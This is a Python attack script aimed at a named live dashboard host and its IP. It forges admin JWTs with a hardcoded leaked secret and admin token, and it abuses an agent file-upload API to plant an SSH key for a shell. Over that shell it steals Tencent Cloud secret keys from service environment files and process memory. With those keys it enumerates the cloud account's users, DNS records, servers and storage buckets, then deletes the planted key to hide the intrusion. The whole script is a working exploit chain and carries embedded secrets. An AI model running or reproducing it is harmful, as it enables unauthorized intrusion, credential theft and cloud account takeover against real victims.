#!/usr/bin/env python3
# i29339: land ubuntu shell on 122.51.1.87 (dashboard files-RPC local-fallback, same as fact#29264/#29333),
# FAST targeted harvest of Tencent Cloud static keys (caddy dnspod drop-in EnvironmentFile + /proc/caddy/environ),
# then enumerate the Tencent account (CAM/dnspod/cvm/vpc/cos/ssm/cdb/clb/tke) to locate zoofi-index origin/DSN/.env.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
import urllib.request, urllib.error, ssl, datetime

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
TARGET = "122.51.1.87"
KEY = "/tmp/ak29339"
START = time.time()

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)
def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=20000, extra_headers=None):
    url = "https://%s%s" % (HOST, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    for h in (extra_headers or []): args += ["-H", h]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jl(s):
    try: return json.loads(s)
    except Exception: return None
def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=70):
    args = ["ssh", "-i", KEY, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes", "-o", "ConnectTimeout=15",
            "-o", "LogLevel=ERROR", "ubuntu@" + TARGET, cmd]
    return run(args, timeout=timeout + 20)

def parse_sections(txt):
    res = {}; cur = None; buf = []
    for line in txt.splitlines():
        if line.startswith("@@") and line.endswith("@@") and len(line) > 4:
            if cur is not None: res[cur] = "\n".join(buf).strip()
            cur = line.strip("@"); buf = []
        else:
            if cur is not None: buf.append(line)
    if cur is not None: res[cur] = "\n".join(buf).strip()
    return res

# ---------- land shell ----------
run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
pub = open(KEY + ".pub").read().strip(); R("P3_pub", pub)
open("/tmp/authorized_keys2_29339", "w").write(pub + "\n")

chain_ok = False
r = call("/api/admin/agents", admin=True, timeout=45, maxlen=600000)
agents = (jl(r["body"]) or {}).get("agents", []) if jl(r["body"]) else []
byid = {a.get("id"): a for a in agents if a.get("id")}
ca = call("/api/internal/connected-agents", extra_headers=["x-internal-token: " + ADMIN_TOKEN], timeout=20, maxlen=200000)
connected = set()
try:
    cj = jl(ca["body"]) or {}
    arr = cj.get("agents") or cj.get("connected") or cj.get("connectedAgents") or []
    if isinstance(arr, dict): arr = list(arr.values())
    for x in arr:
        connected.add(x if isinstance(x, str) else (x.get("id") or x.get("agentId")))
except Exception: pass
R("P1_connected", {"n": len([c for c in connected if c]), "ids": sorted([c for c in connected if c])[:60]})

def score(a):
    cid = a.get("id")
    return (0 if cid not in connected else 1, 0 if a.get("customer") == "aro" else 1,
            0 if str(a.get("status","")).lower() == "provisioning" else 1,
            1 if cid == "agent-15a45493" else 0, cid or "")
ordered = sorted([a for a in agents if a.get("id")], key=score)
attempt_order = [a.get("id") for a in ordered[:6]]

def upload_for(aid, session, path_param, localfile, fname, timeout=60):
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, aid, qp(path_param))
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA, "-H", "Cookie: session=" + session,
            "-F", "files=@%s;filename=%s;type=text/plain" % (localfile, fname),
            "-w", "\n__CODE__%{http_code}", url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0: code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:400]}

chosen = None
for AID in attempt_order:
    a = byid.get(AID)
    if not a: continue
    cust = a.get("customer") or "aro"
    orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser")}
    pr = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25, maxlen=3000)
    sess = forge("af0a2285-490f-11f1-ac43-525400595be1", customer=cust)
    up = upload_for(AID, sess, "/home/ubuntu/.ssh", "/tmp/authorized_keys2_29339", "authorized_keys2")
    rr = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")}, timeout=25, maxlen=3000)
    rc, out, err = ssh("id; hostname; echo SUDO:$(sudo -n true 2>&1 && echo ok || echo no)", timeout=35)
    ok = b"uid=" in out
    R("attempt_" + AID, {"cust": cust, "patch": pr["code"], "upload": up["code"], "restore": (jl(rr["body"]) or {}).get("ip"),
                         "ssh_ok": ok, "ssh_out": out.decode("utf-8","replace")[:300], "ssh_err": err.decode("utf-8","replace")[-300:]})
    if ok: chosen = AID; chain_ok = True; break
R("P6_ssh", {"ok": chain_ok, "chosen": chosen})
if not chain_ok:
    R("P7_result", "NO_SHELL"); print("NO SHELL", flush=True); sys.exit(0)

# ---------- FAST harvest: targeted files, no recursive grep ----------
harv_text = ""
SECS = [
 ("DROPDIR", "sudo ls -la /etc/systemd/system/caddy.service.d/ 2>/dev/null; echo '@@MAIN@@'; sudo cat /etc/systemd/system/caddy.service 2>/dev/null | grep -iE 'Environment|ExecStart'; echo '@@SHOW@@'; sudo systemctl show caddy -p EnvironmentFiles 2>/dev/null", 40),
 ("DROPIN", "sudo cat /etc/systemd/system/caddy.service.d/*.conf 2>/dev/null", 30),
 ("PROCENV", "for p in $(sudo pgrep -x caddy 2>/dev/null; sudo pgrep -f 'caddy' 2>/dev/null); do echo \"PID:$p\"; sudo tr '\\0' '\\n' < /proc/$p/environ 2>/dev/null | grep -aiE 'TENCENTCLOUD|COS_SECRET|DNSPOD|MODERATION|SECRET_ID|SECRET_KEY'; done", 40),
 ("MISC", "echo '@@DOCKERCFG@@'; cat /home/ubuntu/.docker/config.json 2>/dev/null; echo '@@ENVDEVBAK@@'; sudo cat /home/ubuntu/env.dev.bak-gw-20260812 2>/dev/null; echo '@@DF@@'; sudo find /opt/lumii-prod -maxdepth 2 \\( -name '*.sh' -o -name '.env*' -o -name '*.env' \\) 2>/dev/null | head -60", 45),
]
for tag, cmd, tmo in SECS:
    rc, out, err = ssh(cmd, timeout=tmo)
    harv_text += "\n@@@@%s_rc%d@@@@\n" % (tag, rc) + out.decode("utf-8","replace")

# cat any EnvironmentFile referenced by drop-ins
envpaths = set(re.findall(r'EnvironmentFile=\s*-?(\S+)', harv_text))
envpaths |= set(re.findall(r'\/etc\/[A-Za-z0-9_\/.\-]*\.(?:env|conf)\b', harv_text))
envpaths = [p for p in envpaths if p and p not in ('/etc/systemd/system/caddy.service.d/',)]
catcmds = "; ".join("echo '==%s=='; sudo cat '%s' 2>/dev/null" % (p, p) for p in list(envpaths)[:10])
if catcmds:
    rc, out, err = ssh(catcmds, timeout=45)
    harv_text += "\n@@@@ENVFILES@@@@\n" + out.decode("utf-8","replace")

hsec = parse_sections(harv_text)
R("HARV", {"sections": {k: v[:4500] for k, v in hsec.items()}, "len": len(harv_text)})

# also dump raw in case sections didn't parse
R("HARV_RAW", harv_text[-15000:])

# ---------- parse creds ----------
def findval(prefixes):
    out = {}
    for pre in prefixes:
        for rx in [pre + r'[_A-Z]*[=:\'" ]{1,4}([A-Za-z0-9+/=_\-]{16,90})']:
            for m in re.finditer(rx, harv_text):
                v = m.group(1).strip().strip('"\'')
                out.setdefault(pre, []).append(v)
    return out
sid = None; skey = None; cosid = None; coskey = None
m = re.search(r"TENCENTCLOUD_SECRET_ID[=:\s'\"]{1,4}([A-Za-z0-9/+_\-]{16,90})", harv_text); sid = m.group(1) if m else None
m = re.search(r"TENCENTCLOUD_SECRET_KEY[=:\s'\"]{1,4}([A-Za-z0-9/+_\-]{16,90})", harv_text); skey = m.group(1) if m else None
m = re.search(r"COS_SECRET_ID[=:\s'\"]{1,4}([A-Za-z0-9/+_\-]{16,90})", harv_text); cosid = m.group(1) if m else None
m = re.search(r"COS_SECRET_KEY[=:\s'\"]{1,4}([A-Za-z0-9/+_\-]{16,90})", harv_text); coskey = m.group(1) if m else None
R("CRED_FOUND", {"sid": sid, "skey": skey, "cosid": cosid, "coskey": coskey})
if not sid or not skey:
    ssh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED", timeout=30)
    R("P7_result", "NO_TENCENT_KEY_FOUND"); R("P99_done", {"elapsed": int(time.time()-START)}); print("NO KEY", flush=True); sys.exit(0)

# ---------- Tencent Cloud API enumeration ----------
def _sha256hex(s):
    if isinstance(s, str): s = s.encode()
    return hashlib.sha256(s).hexdigest()
def _hmac(key, msg):
    if isinstance(key, str): key = key.encode()
    if isinstance(msg, str): msg = msg.encode()
    return hmac.new(key, msg, hashlib.sha256).digest()

def tc2(service, action, version, region, payload=None, timeout=12, kid=None, kkey=None):
    SID2 = kid or sid; SKEY2 = kkey or skey
    payload = payload or {}
    body = json.dumps(payload, separators=(",", ":")) if payload else "{}"
    host = service + ".tencentcloudapi.com"; ts = int(time.time()); date = datetime.datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d")
    ct = "application/json; charset=utf-8"
    canonical_headers = "content-type:%s\nhost:%s\nx-tc-action:%s\n" % (ct, host, action.lower())
    signed_headers = "content-type;host;x-tc-action"
    canonical_request = "POST\n/\n\n" + canonical_headers + "\n" + signed_headers + "\n" + _sha256hex(body)
    credential_scope = "%s/%s/tc3_request" % (date, service)
    string_to_sign = "TC3-HMAC-SHA256\n%d\n%s\n%s" % (ts, credential_scope, _sha256hex(canonical_request))
    k_date = _hmac("TC3" + SKEY2, date); k_service = _hmac(k_date, service); k_signing = _hmac(k_service, "tc3_request")
    signature = hmac.new(k_signing, string_to_sign.encode(), hashlib.sha256).hexdigest()
    auth = "TC3-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s" % (SID2, credential_scope, signed_headers, signature)
    headers = {"Authorization": auth, "Content-Type": ct, "X-TC-Action": action, "X-TC-Version": version, "X-TC-Timestamp": str(ts), "Host": host}
    if region: headers["X-TC-Region"] = region
    req = urllib.request.Request("https://" + host + "/", data=body.encode(), headers=headers, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ssl._create_unverified_context())
        return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except Exception: return {"Response": {"Error": {"Code": "HTTP%s" % e.code}}}
    except Exception as e:
        return {"Response": {"Error": {"Code": "EXC", "Message": repr(e)[:120]}}}
def terr2(resp):
    e = (resp or {}).get("Response", {}).get("Error")
    return "%s:%s" % (e.get("Code"), str(e.get("Message",""))[:80]) if e else None

appid = tc2("cam", "GetUserAppId", "2019-01-16", "", {})
R("P8_identity", {"appid": (appid.get("Response") or {}), "err": terr2(appid)})
lu = tc2("cam", "ListUsers", "2019-01-16", "", {"Rp": 100})
R("P8_cam_users", {"resp": (lu.get("Response") or {}) if (lu.get("Response") or {}).get("Error") else {"n": len((lu.get("Response") or {}).get("Data", []) or []), "data": (lu.get("Response") or {}).get("Data")}, "err": terr2(lu)})

dns_errors = []; domains = []
d = tc2("dnspod", "DescribeDomainList", "2021-03-23", "", {"Limit": 200})
er = terr2(d)
if er: dns_errors.append({"DescribeDomainList": er})
else:
    for x in (d.get("Response", {}) or {}).get("DomainList", []) or []:
        domains.append({"name": x.get("Name"), "id": x.get("DomainId"), "status": x.get("Status")})
R("P8_dns_domains", {"n": len(domains), "items": domains[:100], "errors": dns_errors})

dns_recs = []
for dm in domains[:40]:
    nm = dm.get("name")
    if not nm: continue
    rr = tc2("dnspod", "DescribeRecordList", "2021-03-23", "", {"Domain": nm, "Limit": 3000})
    er = terr2(rr)
    if er: dns_recs.append({"domain": nm, "err": er}); continue
    recs = (rr.get("Response", {}) or {}).get("RecordList", []) or []
    interesting = []
    for rc in recs:
        val = "%s %s %s" % (rc.get("Name"), rc.get("Type"), rc.get("Value"))
        if re.search(r"zoofi|index|tunnel|3000|33306|cloudflare|workers\.dev|trycloudflare|cfargotunnel|lumii", val, re.I):
            interesting.append({"name": rc.get("Name"), "type": rc.get("Type"), "value": rc.get("Value"), "status": rc.get("Status")})
    dns_recs.append({"domain": nm, "n": len(recs), "interesting": interesting[:80]})
R("P8_dns_records", {"n": len(dns_recs), "items": dns_recs[:50]})

r2 = tc2("cvm", "DescribeRegions", "2017-03-12", "", {})
er = terr2(r2)
regions = [] if er else [x.get("Region") for x in (r2.get("Response", {}) or {}).get("RegionSet", []) if x.get("Region")]
R("P8_regions", {"err": er, "n": len(regions)})
inst = []
for reg in (regions or ["ap-shanghai","ap-guangzhou","ap-beijing","ap-hongkong"]):
    if 1200 < (time.time()-START): break
    resp = tc2("cvm", "DescribeInstances", "2017-03-12", reg, {"Limit": 100})
    er = terr2(resp)
    if er: inst.append({"region": reg, "err": er}); continue
    rs = resp.get("Response", {}) or {}
    if rs.get("TotalCount"):
        for it in rs.get("InstanceSet", []):
            inst.append({"region": reg, "id": it.get("InstanceId"), "name": it.get("InstanceName"),
                         "state": it.get("InstanceState"), "priv": it.get("PrivateIpAddresses"),
                         "pub": it.get("PublicIpAddresses"), "tags": [{t.get("Key"): t.get("Value")} for t in (it.get("Tags") or [])]})
R("P8_instances", {"n": len(inst), "items": inst[:300]})

def cos_auth2(kid, kkey, method, path, params=None):
    st = int(time.time()); sign_time = "%d;%d" % (st-60, st+3600); key_time = sign_time
    sign_key = hmac.new(kkey.encode(), key_time.encode(), hashlib.sha1).hexdigest()
    params = params or {}; enc = lambda v: up.quote(str(v), safe='')
    http_params = "&".join("%s=%s" % (k.lower(), enc(v)) for k, v in sorted(params.items(), key=lambda kv: kv[0].lower()))
    param_list = ";".join(sorted([k.lower() for k in params.keys()]))
    http_string = method.lower()+"\n"+path+"\n"+http_params+"\n\n"
    string_to_sign = "sha1\n"+sign_time+"\n"+hashlib.sha1(http_string.encode()).hexdigest()+"\n"
    sig = hmac.new(sign_key.encode(), string_to_sign.encode(), hashlib.sha1).hexdigest()
    return "q-sign-algorithm=sha1&q-ak=%s&q-sign-time=%s&q-key-time=%s&q-header-list=&q-url-param-list=%s&q-signature=%s" % (kid, sign_time, key_time, param_list, sig)
def cos_get2(kid, kkey, host, path, params=None, timeout=15):
    auth = cos_auth2(kid, kkey, "GET", path, params)
    url = "https://" + host + path
    if params: url += "?" + "&".join("%s=%s" % (k, up.quote(str(v), safe='')) for k, v in params.items())
    req = urllib.request.Request(url, headers={"Authorization": auth}, method="GET")
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ssl._create_unverified_context())
        return resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        try: return e.read().decode("utf-8","replace")
        except Exception: return "HTTP%s" % e.code
    except Exception as e:
        return "EXC:%s" % repr(e)[:120]

kid = cosid or sid; kkey = coskey or skey
svc = cos_get2(kid, kkey, "service.cos.myqcloud.com", "/")
bl = []
for mm in re.finditer(r"<Bucket>(.*?)</Bucket>", svc, re.S):
    blk = mm.group(1); nm = re.search(r"<Name>(.*?)</Name>", blk); loc = re.search(r"<Location>(.*?)</Location>", blk)
    if nm: bl.append({"name": nm.group(1), "loc": (loc.group(1) if loc else "")})
R("P8_cos", {"raw": svc[:1200], "buckets": bl[:100]})

ssh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED", timeout=30)
R("P99_done", {"elapsed": int(time.time()-START)})
print("DONE", flush=True)
